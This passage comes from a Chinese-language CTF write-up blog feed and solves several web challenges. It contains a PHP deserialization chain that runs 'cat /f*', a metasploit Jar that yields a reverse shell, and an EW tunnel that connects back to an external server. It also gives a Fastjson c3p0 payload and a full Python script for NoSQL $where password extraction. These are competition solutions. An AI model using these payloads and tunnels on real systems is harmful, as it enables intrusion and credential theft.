class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>=-<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;ezyii/source/closure/autoload.php&quot;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /f*&#x27;</span>);&#125;;</span><br><span class="line">            <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上述脚本，将所得载荷以 POST 参数 data 传送即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9c17cfff-aaab-4712-80c8-cef14ec595a5&#125;</span><br></pre></td></tr></table></figure><h3 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h3><h4 id="恶意-Jar-的生成"><a href="#恶意-Jar-的生成" class="headerlink" title="恶意 Jar 的生成"></a>恶意 Jar 的生成</h4><blockquote><p><a href="https://www.freebuf.com/vuls/220252.html">https://www.freebuf.com/vuls/220252.html</a></p></blockquote><p>首先运行一个 metasploit 容器，按照参考文章中的内容生成恶意 Jar。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span> run --name metasploit5 -it docker.io/metasploitframework/metasploit-framework /bin/bash</span><br></pre></td></tr></table></figure><p>用 Submit Job 将 Jar 上传到靶机并提交执行后可得反弹 shell。</p><h4 id="内网扫描-amp-EW-代理"><a href="#内网扫描-amp-EW-代理" class="headerlink" title="内网扫描 &amp; EW 代理"></a>内网扫描 &amp; EW 代理</h4><p>使用如下脚本写入一个扫描脚本并执行，可以得到内网中 10.10.1.11:8080 存在新的业务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;for i in &#123;1..254&#125;;do&#x27;</span> &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#123;&#x27;</span>  &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ping -c1 -W1 10.10.1.$i &amp;&amp; echo &quot;10.10.1.$i&quot; is alive;&#x27;</span> &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#125;&amp;&#x27;</span>  &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;done&#x27;</span>  &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;wait&#x27;</span>  &gt;&gt; aaa.sh</span><br></pre></td></tr></table></figure><p>将 EW 放到服务器上，在服务器上执行 ./ew -s rcsocks -l 10031 -e 10032 &amp;，在靶机上使用 wget 获取到 /tmp 下并 chmod 赋权后执行 ./ew -s rssocks -d 8.136.8.210 -e 10032。此时在攻击机上使用 Proxy SwitchyOmega 设置 socks5 代理连接到服务器上设定的端口。给 BurpSuite 也设置对应的代理。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629648489140912/b6a016a4462bef6cf12dd4d16630d1fbbb3ed4f6.png"></p><h4 id="Jar-反编译-amp-业务分析"><a href="#Jar-反编译-amp-业务分析" class="headerlink" title="Jar 反编译 &amp; 业务分析"></a>Jar 反编译 &amp; 业务分析</h4><blockquote><p><a href="http://www.javadecompilers.com/">http://www.javadecompilers.com/</a></p></blockquote><p>使用参考处的网站反编译题目给出的附件，找到如下关键代码，可以得出一对用户名和密码 admin/123456。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Decompiled by Procyon v0.5.36</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ichunqiu.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.SimpleAuthenticationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.AuthorizationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.PrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.AuthorizingRealm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(<span class="keyword">final</span> PrincipalCollection principals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(<span class="keyword">final</span> AuthenticationToken token)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String username = (String)token.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;admin&quot;</span>.equals(username)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnknownAccountException(<span class="string">&quot;\u8d26\u6237\u4e0d\u5b58\u5728!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (AuthenticationInfo)<span class="keyword">new</span> SimpleAuthenticationInfo((Object)username, (Object)<span class="string">&quot;123456&quot;</span>, <span class="keyword">this</span>.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的登录业务使用了 doLogin 路由来进行处理，在 LoginController 中可以看到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123; &quot;/doLogin&quot; &#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doLogin</span><span class="params">(<span class="keyword">final</span> String username, <span class="keyword">final</span> String password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        subject.login((AuthenticationToken)<span class="keyword">new</span> UsernamePasswordToken(username, password));</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;fail!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的业务代码如下，对提交的内容使用了 Fastjson 来处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Decompiled by Procyon v0.5.36</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ichunqiu.web.springshiro.controllers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123; &quot;/&quot; &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String[] blacklist;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastjsonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.blacklist = <span class="keyword">new</span> String[] &#123; <span class="string">&quot;JdbcRowSetImpl&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">waf</span><span class="params">(<span class="keyword">final</span> String payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (payload.contains(<span class="string">&quot;\\x&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (payload.contains(<span class="string">&quot;\\u&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> String key : <span class="keyword">this</span>.blacklist) &#123;</span><br><span class="line">            <span class="keyword">if</span> (payload.contains(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&#123; &quot;/admin/test&quot; &#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(<span class="meta">@RequestBody</span> <span class="keyword">final</span> String json)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.waf(json)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Oh,you can&#x27;t do that&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (json.length() &lt; <span class="number">20000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Oh,you are too short&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test over&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现其对传入的参数长度进行了要求，JSON 的长度需要大于 20000，同时进行了一些过滤。</p><h4 id="Fastjson-c3p0"><a href="#Fastjson-c3p0" class="headerlink" title="Fastjson c3p0"></a>Fastjson c3p0</h4><blockquote><p><a href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a></p></blockquote><p>登录后访问 /admin/test 路由，使用参考中的 payload，将 f 重复几次以满足长度要求。使用 BurpSuite 发送数据包即可获得 flag。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;e&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&#125;,<span class="attr">&quot;f&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,<span class="attr">&quot;userOverridesAsString&quot;</span>:<span class="string">&quot;HexAsciiSerializedMapquot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;966fc4a2-e291-4136-84be-5bfd19b949e2&#125;</span><br></pre></td></tr></table></figure><h3 id="Package-Manager-2021"><a href="#Package-Manager-2021" class="headerlink" title="Package Manager 2021"></a>Package Manager 2021</h3><p>将附件给出的源码解压后审计，可以发现在 init_db.ts 中找到 flag 的位置。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flag = &#123;</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>: admin.id,</span><br><span class="line">    <span class="string">&quot;pack_id&quot;</span>: genPackageId(admin.id),</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Flag is here&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: process.env.FLAG,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只需要以 admin 的身份登录即可。在 /auth 路由下可以发现此处存在 token 的拼接查询。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/auth&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; token &#125; = req.body;</span><br><span class="line"><span class="keyword">if</span> (token !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> (token) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (checkmd5Regex(token)) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">let</span> docs = <span class="keyword">await</span> User.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()</span><br><span class="line"><span class="built_in">console</span>.log(docs);</span><br><span class="line"><span class="keyword">if</span> (docs.length == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(docs[<span class="number">0</span>].isAdmin === <span class="literal">true</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Failed to auth&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;No matching results&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Token must be valid md5 string&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.render(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">req.session.AccessGranted = <span class="literal">true</span></span><br><span class="line">res.redirect(<span class="string">&#x27;/packages/submit&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>同时还对输入的 token 进行了如下的限定，即 checkmd5Regex。其要求所属的内容必须包含符合 <code>([a-f\d]&#123;32&#125;|[A-F\d]&#123;32&#125;)</code> 的正则表达式。因此可以写如下脚本来进行注入，从而得到用户 admin 的密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://ebffa932-6aeb-477e-b9d8-99f4afa3068e.node4.buuoj.cn:81/&quot;</span>)</span><br><span class="line">csrfToken = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fetch csrf_token for the first time</span></span><br><span class="line">response = session.get(<span class="string">&quot;/auth&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line">soup = BeautifulSoup(response.content.decode(), features=<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">csrfToken = (soup.find(attrs=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;_csrf&quot;</span>&#125;)[<span class="string">&quot;value&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">dictionary = string.digits + string.ascii_letters + <span class="string">&quot;!#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">stack = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> stack == <span class="number">31</span>: <span class="comment"># I know there is 30 characters in the password.</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dictionary)):</span><br><span class="line">        response = session.post(<span class="string">&quot;/auth&quot;</span>, data=&#123;</span><br><span class="line">            <span class="string">&quot;_csrf&quot;</span>: csrfToken,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: <span class="string">f&quot;a5511e7415a5a7a1101057415151a91c\&quot; || (this.username == \&quot;admin\&quot; &amp;&amp; this.password[<span class="subst">&#123;stack&#125;</span>] == \&quot;<span class="subst">&#123;dictionary[j]&#125;</span>\&quot;) || \&quot;&quot;</span></span><br><span class="line">        &#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No matching results&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.content.decode() <span class="keyword">and</span> response.status_code == <span class="number">302</span>:</span><br><span class="line">            result += dictionary[j]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found password character <span class="subst">&#123;dictionary[j]&#125;</span>, number <span class="subst">&#123;stack&#125;</span>, currently <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            stack += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(response.content.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行脚本可以得到密码 <code>!@#&amp;@&amp;@efefef*@((@))grgregret3r</code>，使用 admin 和所得的密码登录即可得到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629882901068790/8ae5dec1fd5543f1f36d6efc812cc7354776a884.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cf79f117-66b1-4dab-b7ae-b54a6e95f198&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/a282dc59.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Really Awesome CTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/ca87557c.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/ca87557c.html</guid>
      <pubDate>Wed, 18 Aug 2021 12:56:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;Emojibook&quot;&gt;&lt;a href=&quot;#Emojibook&quot; class=&quot;headerlink&quot; title=&quot;Emojibook&quot;&gt;&lt;/a&gt;Emojibook&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;The flag is at &lt;code&gt;/flag.txt&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;题目给出了完整的代码，且告诉了我们 flag 所在的位置。在 notes/views.py</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Emojibook"><a href="#Emojibook" class="headerlink" title="Emojibook"></a>Emojibook</h3><blockquote><p>The flag is at <code>/flag.txt</code></p></blockquote><p>题目给出了完整的代码，且告诉了我们 flag 所在的位置。在 notes/views.py 下可以发现任意文件读取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_note</span>(<span class="params">request: HttpRequest, pk: <span class="built_in">int</span></span>) -&gt; HttpResponse:</span></span><br><span class="line">    note = get_object_or_404(Note, pk=pk)</span><br><span class="line">    text = note.body</span><br><span class="line">    <span class="keyword">for</span> include <span class="keyword">in</span> re.findall(<span class="string">&quot;(&#123;&#123;.*?&#125;&#125;)&quot;</span>, text):</span><br><span class="line">        <span class="built_in">print</span>(include)</span><br><span class="line">        file_name = os.path.join(<span class="string">&quot;emoji&quot;</span>, re.sub(<span class="string">&quot;[&#123;&#125;]&quot;</span>, <span class="string">&quot;&quot;</span>, include))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            text = text.replace(include, <span class="string">f&quot;&lt;img src=\&quot;data:image/png;base64,<span class="subst">&#123;base64.b64encode(file.read()).decode(<span class="string">&#x27;latin1&#x27;</span>)&#125;</span>\&quot; width=\&quot;25\&quot; height=\&quot;25\&quot; /&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;note.html&quot;</span>, &#123;<span class="string">&quot;note&quot;</span>: note, <span class="string">&quot;text&quot;</span>: text&#125;)</span><br></pre></td></tr></table></figure><p>此时可以发现填入在双花括号中的内容被匹配出来并使用了 os.path.join 